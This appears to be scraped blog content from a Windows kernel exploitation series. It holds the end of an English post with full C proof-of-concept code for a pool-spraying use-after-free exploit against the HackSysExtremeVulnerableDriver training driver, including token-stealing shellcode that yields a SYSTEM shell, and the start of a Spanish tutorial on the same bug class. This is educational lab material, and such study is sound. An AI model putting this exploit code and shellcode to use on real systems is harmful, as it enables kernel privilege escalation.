DISPATCH_LEVEL as well). Between both of these options, option 2 is the easiest and requires less lines of code. The important thing we need to keep in mind is that NPFS will prefix our buffer with its own internal header, which is called a DATA_ENTRY. Each version of NPFS has a slightly different size.\n/* The Entries that go into the Queue */ typedef struct _NP_DATA_QUEUE_ENTRY { LIST_ENTRY QueueEntry; ULONG DataEntryType; PIRP Irp; ULONG QuotaInEntry; PSECURITY_CLIENT_CONTEXT ClientSecurityContext; ULONG DataSize; } NP_DATA_QUEUE_ENTRY, *PNP_DATA_QUEUE_ENTRY; The way to deal with this is to create the user-mode buffer with the right offsets. Finally, the key here is to have a buffer that\u0026rsquo;s at least the size of a page, so we can force the big pool allocator.\nBack to VulnDev # I was still confused on what to do because the blog post from Alex seemed to use both a non-working WinDbg script and Kernel mode driver libraries (maybe I\u0026rsquo;m a n00b?). Likely things have also changed and that code is not directly compatible in our environment.\nThat said, what follows is seeing what VulnDev did and implementing it into our exploit. It appeared that VulnDev was able to accomplish allocating an object (any size \u0026gt;0x48) in the NonPagedPool.\nThe PoC can be seen below:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;psapi.h\u0026gt; // IOCTL Codes #define ALLOCATE_REAL_OBJ 0x222013 #define CALL_FUNC_PTR 0x222017 #define FREE_OBJ 0x22201b #define ALLOCATE_FAKE_OBJ 0x22201f typedef struct PipeHandles { HANDLE read; HANDLE write; } PipeHandles; struct PipeHandles CreatePipeObject() { DWORD ALLOC_SIZE = 0x70; BYTE uBuffer[0x28] = { 0 }; // ALLOC_SIZE - HEADER_SIZE (0x48) HANDLE readPipe = NULL; HANDLE writePipe = NULL; DWORD resultLength = 0; RtlFillMemory(uBuffer, 0x28, 0x41); if (!CreatePipe(\u0026amp;readPipe, \u0026amp;writePipe, NULL, sizeof(uBuffer))) { printf(\u0026#34;[-] CreatePipe\\n\u0026#34;); } if (!WriteFile(writePipe, uBuffer, sizeof(uBuffer), \u0026amp;resultLength, NULL)) { printf(\u0026#34;[-] WriteFile\\n\u0026#34;); } return (struct PipeHandles) {.read = readPipe, .write = writePipe}; } void sendIoctl(HANDLE hHEVD, DWORD dIoctl, CHAR *pBuffer, DWORD dBuffer) { DWORD bytesReturned = 0; DeviceIoControl(hHEVD, dIoctl, pBuffer, dBuffer, NULL, 0x00, \u0026amp;bytesReturned, NULL); return; } int main() { HANDLE hHEVD = NULL; PipeHandles pipeHandle = CreatePipeObject(); printf(\u0026#34;[*] Handles: 0x%llx, 0x%llx\u0026#34;, pipeHandle.read, pipeHandle.write); getchar(); DebugBreak(); hHEVD = CreateFileA(\u0026#34;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026#34;, (GENERIC_READ | GENERIC_WRITE), 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hHEVD == INVALID_HANDLE_VALUE) { printf(\u0026#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver\\n\u0026#34;); return -1; } printf(\u0026#34;[*] Allocating structure\\n\u0026#34;); sendIoctl(hHEVD, ALLOCATE_REAL_OBJ, NULL, 0); printf(\u0026#34;[*] Freeing structure\\n\u0026#34;); sendIoctl(hHEVD, FREE_OBJ, NULL, 0); return 0; } Once again, we\u0026rsquo;re using VulnDevs implementation. If we run this, the handles get printed out to STDOUT and we can inspect them using WinDbg.\nIn the output above we see that the object is in a NonPaged pool but its size is 0x190, what happened? Well as mentioned in the blog post, doing these operations created a DATA_ENTRY object. These objects are allocated using the tag \u0026ldquo;NpFr\u0026rdquo;. We can find it using !poolused. Like VulnDev when trying to find this using poolfind I had no luck\u0026hellip;\nHowever, this shows we have successfully allocated 112 bytes in the NonPaged pool. It all makes sense now\u0026hellip; the equation is basically:\nsizeof(uBuffer) + (sizeof(_NP_DATA_QUEUE_ENTRY) == 0x48) == ALLOC_SIZE This is proven if we run the code again with proper modifications:\nThere\u0026rsquo;s another problem, I did not think about myself. Since the kernel has allocations occurring at all times, there\u0026rsquo;s no guarantee that our allocation will take the location of the free\u0026rsquo;d object.\nA way to get around this is to create a bunch of holes, surrounded by allocations we control. This gives us a good chance to get our UAF condition. Once we\u0026rsquo;ve allocated and free\u0026rsquo;d the normal object, we can create a bunch of fake objects using AllocateFakeObjectNonPagedPool increasing our chances of taking the free\u0026rsquo;d allocations memory.\nBasically, what we\u0026rsquo;re going to do is:\nAllocate a bunch of DATA_ENTRY objects (CreatePipe + WriteFile) Free every 2nd DATA_ENTRY object to create free allocation locations (holes) Allocate the USE_AFTER_FREE_NON_PAGED_POOL structure Free the USE_AFTER_FREE_NON_PAGED_POOL structure Try to reclaim the free\u0026rsquo;d memory (where the USE_AFTER_FREE_NON_PAGED_POOL structure once was) Trigger the UAF calling our fake object To achieve this I used the following code:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;psapi.h\u0026gt; // IOCTL Codes #define ALLOCATE_REAL_OBJ 0x222013 #define CALL_FUNC_PTR 0x222017 #define FREE_OBJ 0x22201b #define ALLOCATE_FAKE_OBJ 0x22201f typedef struct PipeHandles { HANDLE read; HANDLE write; } PipeHandles; struct PipeHandles CreatePipeObject() { BYTE uBuffer[0x18] = { 0 }; // sizeof(uBuffer) + (sizeof(_NP_DATA_QUEUE_ENTRY) == 0x48) == ALLOC_SIZE HANDLE readPipe = NULL; HANDLE writePipe = NULL; DWORD resultLength = 0; RtlFillMemory(uBuffer, 0x18, 0x41); if (!CreatePipe(\u0026amp;readPipe, \u0026amp;writePipe, NULL, sizeof(uBuffer))) { printf(\u0026#34;[-] CreatePipe\\n\u0026#34;); } if (!WriteFile(writePipe, uBuffer, sizeof(uBuffer), \u0026amp;resultLength, NULL)) { printf(\u0026#34;[-] WriteFile\\n\u0026#34;); } return (struct PipeHandles) {.read = readPipe, .write = writePipe}; } void sendIoctl(HANDLE hHEVD, DWORD dIoctl, CHAR *pBuffer, DWORD dBuffer) { DWORD bytesReturned = 0; DeviceIoControl(hHEVD, dIoctl, pBuffer, dBuffer, NULL, 0x00, \u0026amp;bytesReturned, NULL); return; } #define DEF_PIPES 20000 #define SEQ_PIPES 60000 int main() { int i = 0; HANDLE hHEVD = NULL; BYTE uBuffer[0x58] = {0}; PipeHandles defragPipeHandles[DEF_PIPES] = {0}; PipeHandles seqPipeHandles[SEQ_PIPES] = {0}; hHEVD = CreateFileA(\u0026#34;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026#34;, (GENERIC_READ | GENERIC_WRITE), 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hHEVD == INVALID_HANDLE_VALUE) { printf(\u0026#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver\\n\u0026#34;); return -1; } /* I found this intresting, we must allocate DATA_ENTRY objects like so otherwise we will fail to allocate any. We have to start with a low amount THEN allocate the sequential DATA_ENTRY objects. Although this is just 80000 allocations, we CANNOT just use one loop to hold all 80000 allocations. We must space it out */ printf(\u0026#34;[*] Spraying objects for pool defragmentation\\n\u0026#34;); for (i = 0; i \u0026lt; DEF_PIPES; i++) defragPipeHandles[i] = CreatePipeObject(); for (i = 0; i \u0026lt; SEQ_PIPES; i++) seqPipeHandles[i] = CreatePipeObject(); printf(\u0026#34;[*] Creating holes to store object\\n\u0026#34;); for (i = 0; i \u0026lt; SEQ_PIPES; i++) { if (i % 2 == 0) { CloseHandle(seqPipeHandles[i].read); CloseHandle(seqPipeHandles[i].write); } } printf(\u0026#34;[*] Allocating target structure\\n\u0026#34;); sendIoctl(hHEVD, ALLOCATE_REAL_OBJ, NULL, 0); printf(\u0026#34;[*] Freeing target structure\\n\u0026#34;); sendIoctl(hHEVD, FREE_OBJ, NULL, 0); printf(\u0026#34;[*] Filling holes with custom objects\\n\u0026#34;); *(uint64_t *)(uBuffer) = (uint64_t)(0x41414141); for (int i = 0; i \u0026lt; 30000; i++) sendIoctl(hHEVD, ALLOCATE_FAKE_OBJ, uBuffer, sizeof(uBuffer)); printf(\u0026#34;[*] Triggering UAF\\n\u0026#34;); sendIoctl(hHEVD, CALL_FUNC_PTR, NULL, 0); return 0; } Exploitation # So how can we get to our shellcode? We learned when trying to obtain code execution on Windows 10 one of the attack paths is to mark the Page Table Entry (PTE) as a Kernel page. However, since the allocation was made by the kernel and marked executable, the entry pointed to by RAX should be clear for execution!\nSince we have 0x60 bytes of space this should be more than enough room for our token stealing payload + recovery code. The escape plan is as follows:\nFind a gadget to: Increment RAX to point past the first 8 bytes in the NonPaged pool allocation Jump to RAX Execute Shellcode Fix Stack Below is a rough visual of what we\u0026rsquo;re trying to accomplish.\nAfter a good amount of tug of war, we\u0026rsquo;re able to get a SYSTEM shell on Winderp 11.\nBelow is the final PoC:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;psapi.h\u0026gt; // IOCTL Codes #define ALLOCATE_REAL_OBJ 0x222013 #define CALL_FUNC_PTR 0x222017 #define FREE_OBJ 0x22201b #define ALLOCATE_FAKE_OBJ 0x22201f // DATA_ENTRY Allocations #define DEF_PIPES 20000 #define SEQ_PIPES 60000 /* CreatePipeObject(): This function creates a pipe and returns the handles to the read and write ends of said pipe. However, what this does in the case of our exploit is create an allocation in the NonPaged pool. It\u0026#39;s important to note each allocation is made by the Named Pipe File System (NPFS.sys). That said it will prepend an allocation with a DATA_ENTRY structure (or NP_DATA_QUEUE_ENTRY), on an x86_64 system this structure is 0x48 bytes. So each allocation must be greater than 0x48 bytes. Equation below: CreatePipe(HANDLE hR, HANDLE hW, NULL, nSize); NonPagedAllocation = nSize + sizeof(_NP_DATA_QUEUE_ENTRY) So in our case we\u0026#39;re allocating 0x60 bytes in the NonPaged pool. This code was taken from VulnDevs blog located here: https://vulndev.io/2022/07/14/windows-kernel-exploitation-hevd-x64-use-after-free/ The only difference is this was written in C vs C++ */ typedef struct PipeHandles { HANDLE read; HANDLE write; } PipeHandles; struct PipeHandles CreatePipeObject() { BYTE uBuffer[0x18] = { 0 }; HANDLE readPipe = NULL; HANDLE writePipe = NULL; DWORD resultLength = 0; RtlFillMemory(uBuffer, 0x18, 0x41); if (!CreatePipe(\u0026amp;readPipe, \u0026amp;writePipe, NULL, sizeof(uBuffer))) { printf(\u0026#34;[-] CreatePipe\\n\u0026#34;); } if (!WriteFile(writePipe, uBuffer, sizeof(uBuffer), \u0026amp;resultLength, NULL)) { printf(\u0026#34;[-] WriteFile\\n\u0026#34;); } return (struct PipeHandles) {.read = readPipe, .write = writePipe}; } /* SendIOCTL(): Send the IOCTL code to the driver */ void SendIOCTL(HANDLE hHEVD, DWORD dIoctl, CHAR *pBuffer, DWORD dBuffer) { DWORD bytesReturned = 0; DeviceIoControl(hHEVD, dIoctl, pBuffer, dBuffer, NULL, 0x00, \u0026amp;bytesReturned, NULL); return; } /* GetKernelBaseAddress(): Using EnumDeviceDrivers() obtain the base address of ntoskrnl.exe */ uint64_t GetKernelBaseAddress() { ULONG_PTR pKernelBaseAddress = 0; LPVOID *lpImageBase = NULL; DWORD dwBytesNeeded = 0; if (!EnumDeviceDrivers(NULL, 0, \u0026amp;dwBytesNeeded)) { printf(\u0026#34;[-] Failed to calculate bytes needed for device driver entries\u0026#34;); return -1; } if (!(lpImageBase = (LPVOID *)HeapAlloc(GetProcessHeap(), 0, dwBytesNeeded))) { printf(\u0026#34;[-] Failed to allocate heap for lpImageBase\\n\u0026#34;); if (lpImageBase) { HeapFree(GetProcessHeap(), 0, lpImageBase); } return -1; } if (!EnumDeviceDrivers(lpImageBase, dwBytesNeeded, \u0026amp;dwBytesNeeded)) { printf(\u0026#34;[-] EnumDeviceDrivers: %d\u0026#34;, GetLastError()); if (lpImageBase) { HeapFree(GetProcessHeap(), 0, lpImageBase); } return -1; } pKernelBaseAddress = ((ULONG_PTR *)lpImageBase)[0]; HeapFree(GetProcessHeap(), 0, lpImageBase); printf(\u0026#34;[*] Kernel Base Address: %llx\\n\u0026#34;, pKernelBaseAddress); return pKernelBaseAddress; } /* CheckWin(): Simple function to check if we\u0026#39;re running as SYSTEM */ int CheckWin(VOID) { DWORD win = 0; DWORD dwLen = 0; CHAR *cUsername = NULL; GetUserNameA(NULL, \u0026amp;dwLen); if (dwLen \u0026gt; 0) { cUsername = (CHAR *)malloc(dwLen * sizeof(CHAR)); } else { printf(\u0026#34;[-] Failed to allocate buffer for username check\\n\u0026#34;); return -1; } GetUserNameA(cUsername, \u0026amp;dwLen); win = strcmp(cUsername, \u0026#34;SYSTEM\u0026#34;); free(cUsername); return (win == 0) ? win : -1; } /* Exploit(): NonPaged Pool UAF */ int Exploit(HANDLE hHEVD) { PipeHandles defragPipeHandles[DEF_PIPES] = {0}; PipeHandles seqPipeHandles[SEQ_PIPES] = {0}; int i = 0; int64_t kernelBaseAddr = GetKernelBaseAddress(); char cShellcode[0x58] = \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; // FUNCTION POINTER \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; // NOP SLED // sickle -p windows/x64/kernel_token_stealer -f c -m pinpoint \u0026#34;\\x65\\x48\\xa1\\x88\\x01\\x00\\x00\\x00\\x00\\x00\\x00\u0026#34; // movabs rax, qword ptr gs:[0x188] \u0026#34;\\x48\\x8b\\x80\\xb8\\x00\\x00\\x00\u0026#34; // mov rax, qword ptr [rax + 0xb8] \u0026#34;\\x48\\x89\\xc1\u0026#34; // mov rcx, rax \u0026#34;\\xb2\\x04\u0026#34; // mov dl, 4 \u0026#34;\\x48\\x8b\\x80\\x48\\x04\\x00\\x00\u0026#34; // mov rax, qword ptr [rax + 0x448] \u0026#34;\\x48\\x2d\\x48\\x04\\x00\\x00\u0026#34; // sub rax, 0x448 \u0026#34;\\x38\\x90\\x40\\x04\\x00\\x00\u0026#34; // cmp byte ptr [rax + 0x440], dl \u0026#34;\\x75\\xeb\u0026#34; // jne 0x1017 \u0026#34;\\x48\\x8b\\x90\\xb8\\x04\\x00\\x00\u0026#34; // mov rdx, qword ptr [rax + 0x4b8] \u0026#34;\\x48\\x89\\x91\\xb8\\x04\\x00\\x00\u0026#34; // mov qword ptr [rcx + 0x4b8], rdx // KERNEL RECOVERY \u0026#34;\\x48\\x31\\xc0\u0026#34; // xor rax, rax \u0026#34;\\x48\\x83\\xc4\\x48\u0026#34; // add rsp, 0x48 \u0026#34;\\xc3\u0026#34;; // ret /* I found this intresting, we must allocate DATA_ENTRY objects like so otherwise we will fail to allocate any. We have to start with a low amount THEN allocate the sequential DATA_ENTRY objects. Although this is just 80000 allocations, we CANNOT just use one loop to hold all 80000 allocations. We must space it out */ printf(\u0026#34;[*] Spraying objects for pool defragmentation\\n\u0026#34;); for (i = 0; i \u0026lt; DEF_PIPES; i++) defragPipeHandles[i] = CreatePipeObject(); for (i = 0; i \u0026lt; SEQ_PIPES; i++) seqPipeHandles[i] = CreatePipeObject(); printf(\u0026#34;[*] Creating holes to store object\\n\u0026#34;); for (i = 0; i \u0026lt; SEQ_PIPES; i++) { if (i % 2 == 0) { CloseHandle(seqPipeHandles[i].read); CloseHandle(seqPipeHandles[i].write); } } printf(\u0026#34;[*] Allocating target structure\\n\u0026#34;); SendIOCTL(hHEVD, ALLOCATE_REAL_OBJ, NULL, 0); printf(\u0026#34;[*] Freeing target structure\\n\u0026#34;); SendIOCTL(hHEVD, FREE_OBJ, NULL, 0); printf(\u0026#34;[*] Filling holes with custom objects\\n\u0026#34;); *(uint64_t *)(cShellcode) = (uint64_t)(kernelBaseAddr + 0x40176b); /* add al, 0x10 ; call rax [nt] */ for (int i = 0; i \u0026lt; 30000; i++) SendIOCTL(hHEVD, ALLOCATE_FAKE_OBJ, cShellcode, 0x58); printf(\u0026#34;[*] Triggering UAF\\n\u0026#34;); SendIOCTL(hHEVD, CALL_FUNC_PTR, NULL, 0); return CheckWin(); } int main() { HANDLE hHEVD = NULL; hHEVD = CreateFileA(\u0026#34;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026#34;, (GENERIC_READ | GENERIC_WRITE), 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hHEVD == INVALID_HANDLE_VALUE) { printf(\u0026#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver\\n\u0026#34;); return -1; } if (Exploit(hHEVD) == 0) { printf(\u0026#34;[*] Exploitation successful, enjoy your shell\\n\\n\u0026#34;); system(\u0026#34;cmd.exe\u0026#34;); } else { printf(\u0026#34;[-] Exploitation failed, run again\\n\u0026#34;); return -1; } return 0; } Once compiled (x86_64-w64-mingw32-gcc poc.c -o poc.exe), we get our shell :)\nSources # https://media.blackhat.com/bh-dc-11/Mandt/BlackHat_DC_2011_Mandt_kernelpool-wp.pdf https://vulndev.io/2022/07/14/windows-kernel-exploitation-hevd-x64-use-after-free/ https://web.archive.org/web/20230602115237/https://www.alex-ionescu.com/kernel-heap-spraying-like-its-2015-swimming-in-the-big-kids-pool/ https://www.sstic.org/media/SSTIC2020/SSTIC-actes/pool_overflow_exploitation_since_windows_10_19h1/SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1-bayet_fariello.pdf https://connormcgarr.github.io/swimming-in-the-kernel-pool-part-1/ https://www.vergiliusproject.com/ ","date":"21 December 2024","externalUrl":null,"permalink":"/posts/0x03-approaching-the-modern-windows-kernel-heap/","section":"Posts","summary":"","title":"0x03 - Approaching the Modern Windows Kernel Heap","type":"posts"},{"content":"Si has estado siguiendo la serie de Windows Kernel Exploitation consecutivamente, deberías haber exploited un Stack Overflow básico contra Windows 7 (x86) y Windows 10 (x64). Aunque este es un salto grande, hay muchas más vulnerabilidades que pueden resultar en la ejecución de código. La mejor manera de familiarizarse con ellos es estudiarlos en un sistema con mitigaciones mínimas. Por este motivo volveremos a Windows 7 (x86).\nAdemás, no utilizaremos Ghidra, esta vez usaremos el código de HEVD. En el próximo artículo volveremos a Ghidra para obtiene una perspectiva sobre cómo lo identificarías utilizando el código o el decompiler.\nTable of Contents # Qué es un Use After Free (Alto Nivel) Usando el Código - Ubicarnos con el Diseño Entender el AllocateUaFObjectNonPagedPoolIoctlHandler Entender el UseUaFObjectNonPagedPoolIoctlHandler Entender el FreeUaFObjectNonPagedPoolIoctlHandler Entender el AllocateFakeObjectNonPagedPoolIoctlHandler Descripciones de Funciones Explotación Recursos Qué es un Use After Free (Alto Nivel) # En caso que no estés familiarizado que es un \u0026ldquo;Use After Free (UaF)\u0026rdquo;, vamos a cubrirlo con una descripción general en que es esta clase de vulnerabilidad. Básicamente, un Use After Free (UaF) ocurre cuando nosotros usamos un objeto después de ser libre. Este objeto puede ser cualquier estructura o clase metido en memoria que luego se libera\nPara usar un ejemplo sin ser demasiado técnico, digamos que estás trabajando debajo de un caro y pones tus herramientas a tu lado. Estás trabajando en tu espalda y no estás poniéndo atención a tu caja de herramientas, simplemente metes tu mano en la caja de herramientas y buscas lo que necesitas\nEn esta caja de herramientas solo tienes una llave (difícil de creer lo sé), agarras una llave, pero en lugar de volver a guardarla en la caja de herramientas la pones en el suelo cerca de tus pies. Aunque lo pusiste cerca a tus pies, tu crees que la llave la regresaste en su ubicación original.\nSin que te des cuenta, un hombre tira una lata de soda adentro de la caja de herramientas\nCuando vas y alcanzas la llave no notas la diferencia entre ella y la lata (porque tienes aletas eres un pingüino). Entonces, terminas cubierto en soda.\nOH NO!! Hemos caido víctima a un UaF, el hombre logro aprovecha la vulnerabilidad.\nQué tiene que ver esto con las computadoras?\nEl ejemplo de meter la mano en la caja de herramientas sin mirar, es similar en cómo los programas usan la memoria sin \u0026ldquo;mirar\u0026rdquo; (verificando si es válido o a cambiado) El reemplazo de la llave por la soda demuestra como los \u0026ldquo;stale reference (pointers)\u0026rdquo; resultar en operaciones peligrosas El hombre tirando la soda representa un atacante aprovechando la memoria liberada (por ejemplo inyectando código malicioso dentro de la memoria reutilizada). Con esto, estamos listos para comenzar :)\nUsando el Código - Ubicarnos con el Diseño # Lo primero que queremos identificar es la ubicación de los códigos de control I/O. Por lo que se parece, cada vulnerabilidad tiene su propia función de \u0026ldquo;handler\u0026rdquo; (controlador).\n./ArbitraryWrite.c:129:/// Arbitrary Write Ioctl Handler ./MemoryDisclosureNonPagedPool.c:178:/// Memory Disclosure NonPagedPool Ioctl Handler ./DoubleFetch.c:151:/// Double Fetch Ioctl Handler ./BufferOverflowNonPagedPool.c:165:/// Buffer Overflow NonPagedPool Ioctl Handler ./MemoryDisclosureNonPagedPoolNx.c:177:/// Memory Disclosure NonPagedPoolNx Ioctl Handler ./IntegerOverflow.c:154:/// Integer Overflow Ioctl Handler ./UninitializedMemoryPagedPool.c:216:/// Uninitialized Memory PagedPool Ioctl Handler ./WriteNULL.c:117:/// Write NULL Ioctl Handler ./InsecureKernelResourceAccess.c:148:/// Insecure Kernel File Access Ioctl Handler ./BufferOverflowPagedPoolSession.c:165:/// Buffer Overflow PagedPoolSession Ioctl Handler ./BufferOverflowNonPagedPoolNx.c:165:/// Buffer Overflow NonPagedPoolNx Ioctl Handler ./UseAfterFreeNonPagedPool.c:352:/// Allocate UaF Object NonPagedPool Ioctl Handler ./UseAfterFreeNonPagedPool.c:376:/// Use UaF Object NonPagedPool Ioctl Handler ./UseAfterFreeNonPagedPool.c:400:/// Free UaF Object NonPagedPool Ioctl Handler ./UseAfterFreeNonPagedPool.c:424:/// Allocate Fake Object NonPagedPool Ioctl Handler ./UseAfterFreeNonPagedPoolNx.c:352:/// Allocate UaF Object NonPagedPoolNx Ioctl Handler ./UseAfterFreeNonPagedPoolNx.c:376:/// Use UaF Object NonPagedPoolNx Ioctl Handler ./UseAfterFreeNonPagedPoolNx.c:400:/// Free UaF Object NonPagedPoolNx Ioctl Handler ./UseAfterFreeNonPagedPoolNx.c:424:/// Allocate Fake Object NonPagedPoolNx Ioctl Handler ./BufferOverflowStack.c:121:/// Buffer Overflow Stack Ioctl Handler ./ArbitraryReadWriteHelperNonPagedPoolNx.c:553:/// Create Arbitrary Read Write Helper Object Ioctl Handler ./ArbitraryReadWriteHelperNonPagedPoolNx.c:582:/// Set Arbitrary Read Write Helper Object Name Ioctl Handler ./ArbitraryReadWriteHelperNonPagedPoolNx.c:611:/// Get Arbitrary Read Write Helper Object Name Ioctl Handler ./ArbitraryReadWriteHelperNonPagedPoolNx.c:640:/// Delete Arbitrary Read Write Helper Object Ioctl Handler ./UninitializedMemoryStack.c:160:/// Uninitialized Memory Stack Ioctl Handler ./NullPointerDereference.c:200:/// Null Pointer Dereference Ioctl Handler ./BufferOverflowStackGS.c:121:/// Buffer Overflow Stack GS Ioctl Handler ./TypeConfusion.c:213:/// Type Confusion Ioctl Handler Estamos interesados ​​en los códigos de control para el UseAfterFreeNonPagedPool.\n./UseAfterFreeNonPagedPool.c:352:/// Allocate UaF Object NonPagedPool Ioctl Handler ./UseAfterFreeNonPagedPool.c:376:/// Use UaF Object NonPagedPool Ioctl Handler ./UseAfterFreeNonPagedPool.c:400:/// Free UaF Object NonPagedPool Ioctl Handler ./UseAfterFreeNonPagedPool.c:424:/// Allocate Fake Object NonPagedPool Ioctl Handler Según la convención de nomenclatura, podemos identificar las siguientes funciones:\nAllocateUaFObjectNonPagedPoolIoctlHandler( UseUaFObjectNonPagedPoolIoctlHandler( FreeUaFObjectNonPagedPoolIoctlHandler( AllocateFakeObjectNonPagedPoolIoctlHandler( Si rastreamos desde dónde se llaman estas funciones, llegamos a ./HackSysExtremeVulnerableDriver.c que contiene un \u0026ldquo;switch statement\u0026rdquo; que nos permitiría activar estas funciones vulnerables.\n294 case HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL: 295 DbgPrint(\u0026#34;****** HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL ******\\n\u0026#34;); 296 Status = AllocateUaFObjectNonPagedPoolIoctlHandler(Irp, IrpSp); 297 DbgPrint(\u0026#34;****** HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL ******\\n\u0026#34;); 298 break; 299 case HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL: 300 DbgPrint(\u0026#34;****** HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL ******\\n\u0026#34;); 301 Status = UseUaFObjectNonPagedPoolIoctlHandler(Irp, IrpSp); 302 DbgPrint(\u0026#34;****** HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL ******\\n\u0026#34;); 303 break; 304 case HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL: 305 DbgPrint(\u0026#34;****** HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL ******\\n\u0026#34;); 306 Status = FreeUaFObjectNonPagedPoolIoctlHandler(Irp, IrpSp); 307 DbgPrint(\u0026#34;****** HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL ******\\n\u0026#34;); 308 break; 309 case HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL: 310 DbgPrint(\u0026#34;****** HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL ******\\n\u0026#34;); 311 Status = AllocateFakeObjectNonPagedPoolIoctlHandler(Irp, IrpSp); 312 DbgPrint(\u0026#34;****** HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL ******\\n\u0026#34;); 313 break; Sin embargo, esto todavía no nos dio los códigos de I/O, así que antes de intentar buscar dentro de cada página usando grep-fu, revisemos el \u0026ldquo;header file\u0026rdquo; HackSysExtremeVulnerableDriver.h.\nDentro de ella se nos da una lista de códigos IOCTL :)\n81 #define HEVD_IOCTL_BUFFER_OVERFLOW_STACK IOCTL(0x800) 82 #define HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS IOCTL(0x801) 83 #define HEVD_IOCTL_ARBITRARY_WRITE IOCTL(0x802) 84 #define HEVD_IOCTL_BUFFER_OVERFLOW_NON_PAGED_POOL IOCTL(0x803) 85 #define HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL IOCTL(0x804) 86 #define HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL IOCTL(0x805) 87 #define HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL IOCTL(0x806) 88 #define HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL IOCTL(0x807) 89 #define HEVD_IOCTL_TYPE_CONFUSION IOCTL(0x808) 90 #define HEVD_IOCTL_INTEGER_OVERFLOW IOCTL(0x809) 91 #define HEVD_IOCTL_NULL_POINTER_DEREFERENCE IOCTL(0x80A) 92 #define HEVD_IOCTL_UNINITIALIZED_MEMORY_STACK IOCTL(0x80B) 93 #define HEVD_IOCTL_UNINITIALIZED_MEMORY_PAGED_POOL IOCTL(0x80C) 94 #define HEVD_IOCTL_DOUBLE_FETCH IOCTL(0x80D) 95 #define HEVD_IOCTL_INSECURE_KERNEL_FILE_ACCESS IOCTL(0x80E) 96 #define HEVD_IOCTL_MEMORY_DISCLOSURE_NON_PAGED_POOL IOCTL(0x80F) 97 #define HEVD_IOCTL_BUFFER_OVERFLOW_PAGED_POOL_SESSION IOCTL(0x810) 98 #define HEVD_IOCTL_WRITE_NULL IOCTL(0x811) 99 #define HEVD_IOCTL_BUFFER_OVERFLOW_NON_PAGED_POOL_NX IOCTL(0x812) 100 #define HEVD_IOCTL_MEMORY_DISCLOSURE_NON_PAGED_POOL_NX IOCTL(0x813) 101 #define HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL_NX IOCTL(0x814) 102 #define HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL_NX IOCTL(0x815) 103 #define HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL_NX IOCTL(0x816) 104 #define HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL_NX IOCTL(0x817) 105 #define HEVD_IOCTL_CREATE_ARW_HELPER_OBJECT_NON_PAGED_POOL_NX IOCTL(0x818) 106 #define HEVD_IOCTL_SET_ARW_HELPER_OBJECT_NAME_NON_PAGED_POOL_NX IOCTL(0x819) 107 #define HEVD_IOCTL_GET_ARW_HELPER_OBJECT_NAME_NON_PAGED_POOL_NX IOCTL(0x81A) 108 #define HEVD_IOCTL_DELETE_ARW_HELPER_OBJECT_NON_PAGED_POOL_NX IOCTL(0x81B) Sin embargo, para este tutorial solo nos centraremos en lo siguiente:\n85 #define HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL IOCTL(0x804) 86 #define HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL IOCTL(0x805) 87 #define HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL IOCTL(0x806) 88 #define HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL IOCTL(0x807) Entender el AllocateUaFObjectNonPagedPoolIoctlHandler # Podemos encontrar esta función dentro de UseAfterFreeNonPagedPool.c en línea 357.\n357 NTSTATUS 358 AllocateUaFObjectNonPagedPoolIoctlHandler( 359 _In_ PIRP Irp, 360 _In_ PIO_STACK_LOCATION IrpSp 361 ) 362 { 363 NTSTATUS Status = STATUS_UNSUCCESSFUL; 364 365 UNREFERENCED_PARAMETER(Irp); 366 UNREFERENCED_PARAMETER(IrpSp); 367 PAGED_CODE(); 368 369 